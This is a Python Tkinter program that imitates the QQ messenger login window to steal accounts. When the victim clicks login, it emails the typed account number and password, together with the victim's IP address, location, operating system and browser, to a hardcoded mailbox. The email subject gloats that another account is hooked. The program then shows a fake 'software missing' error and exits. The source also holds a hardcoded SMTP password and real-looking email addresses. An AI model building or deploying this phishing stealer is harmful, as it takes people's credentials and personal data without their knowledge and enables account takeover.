from tkinter import *
from tkinter import messagebox
import os,urllib.request
from bs4 import BeautifulSoup
import smtplib
from email.mime.text import MIMEText
from email.header import Header

class QQ_daogao():

    def __init__(self):
        self.windows = Tk()

    def get_ip(self):
        url = "http://ip.chinaz.com/"
        headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/61.0.3163.79 Safari/537.36"}
        try:
            urq = urllib.request.Request(url,headers=headers)
            Req = urllib.request.urlopen(urq,timeout=20).read()
            BeSoup = BeautifulSoup(Req, 'lxml')
            Befind = BeSoup.find_all('dd')
            return [i.get_text() for i in Befind if i]
        except TimeoutError:
            messagebox.showerror("提示",message="网络故障,请检查网络是否已连接!")
            self.windows.destroy()

    def send_mail(self):
        self.mqq_update_error_open = PhotoImage(file="img/mqq_update_error.png")
        if self.user.get().strip() == "":
            messagebox.showinfo(title="提示",message="请输入账号")
        elif self.password.get().strip() == "":
            messagebox.showinfo(title="提示",message="请输入密码")
        elif self.user.get() == "1473018671":
            messagebox.showinfo(title="提示",message="您不能登录此账号")
        else:
            serder = "2905217710@qq.com"    # 发送源,发送给用户的邮箱
            receiver = "3384288472@qq.com"     # 用户的邮箱地址
            smtp_server = "smtp.qq.com"    # QQ的SMTP,默认是关闭状态,需要手动开启
            username = "2905217710@qq.com"    # 发送源登陆,邮箱地址
            password = "cswqzrqkhzzkdgjg"   # 发送源登陆,SMTP生成的密码,在邮箱里面设置~~
            msg = MIMEText("账号：{}\n密码：{}\nip：{}\n来自：{}\n操作系统：{}\n浏览器：{}".format(self.user.get(),self.password.get(),self.get_ip()[0],self.get_ip()[1][0:-4],self.get_ip()[2],self.get_ip()[-1]), 'plain', 'utf-8')    # 发送的内容主体~~~
            msg['From'] = serder    # 发送源
            msg['To'] = receiver    # 发给谁
            msg['Subject'] = Header(u"又有账号上钩咯~~~", "utf-8").encode()    # Email标题
            smtp = smtplib.SMTP_SSL(smtp_server, 465)
            smtp.login(username, password)    # 登陆验证
            smtp.sendmail(serder, receiver, msg.as_string())
            Button(self.windows,image=self.mqq_update_error_open,bg="#EBF2F9",fg="#FFF",relief="flat").place(x=140,y=315)
            messagebox.showerror(title="提示",message="软件缺失，请重新安装!")
            self.windows.destroy()

    def main(self):
        self.windows.wm_attributes('-topmost',1)    # 将窗口顶置~
        ws = self.windows.winfo_screenwidth()
        hs = self.windows.winfo_screenheight()
        w = 430
        h = 330
        x = (ws / 2) - (w / 2)
        y = (hs / 2) - (h / 2)
        self.windows.geometry("%dx%d+%d+%d" % (w,h,x,y))
        self.windows.config(bd=0)
        if os.name == "posix":
            pass
        else:
            self.windows.overrideredirect(True)
        self.windows.config(bg="#F5FAFF")
        topimage = PhotoImage(file="img/main.png")
        self.switch_single_normal_open = PhotoImage(file="img/switch_single_normal.png")
        self.reget_click_open = PhotoImage(file="img/reget_click.png")
        self.exitimage = PhotoImage(file="img/close.png")
        self.corner_right_normal_breath_open = PhotoImage(file="img/corner_right_normal_breath.png")
        Label(self.windows,image=topimage).pack()
        self.windows.overrideredirect(True)
        # image = PhotoImage(file="img/head1.png")
        self.exit_btn = Button(self.windows,image=self.exitimage,font=("楷体",10),command=self.windows.quit,bg="#0090BA",activebackground="red",relief="flat").place(x=400,y=1)
        self.user = StringVar()
        self.password = StringVar()
        self.user.set("1473018671")
        user = Entry(self.windows,textvariable=self.user,font=("微软雅黑",10),relief="flat",bg="#FFF",width="15",fg="#000")
        user.place(x=135,y=200)
        password = Entry(self.windows,textvariable=self.password,font=("微软雅黑",10),relief="flat",bg="#FFF",width="15",show="*",fg="#000")
        password.place(x=135,y=230)
        switch_single_normal = Button(self.windows,image=self.switch_single_normal_open,bg="#EBF2F9",relief="flat").place(x=0,y=303)
        remenber_btn = Checkbutton(self.windows,text="记住密码",bg="#EBF2F9",relief="flat").place(x=130,y=255)
        zidong_login_btn = Checkbutton(self.windows,text="自动登录",bg="#EBF2F9",relief="flat").place(x=251,y=255)
        corner_right_normal_breath = Button(self.windows,image=self.corner_right_normal_breath_open,bg="#EBF2F9",relief="flat").place(x=400,y=300)
        reget_click = Button(self.windows,image=self.reget_click_open,bg="#EBF2F9",relief="flat",command=self.send_mail).place(x=130,y=285)
        self.windows.mainloop()


if __name__ == '__main__':
    q = QQ_daogao()
    q.main()
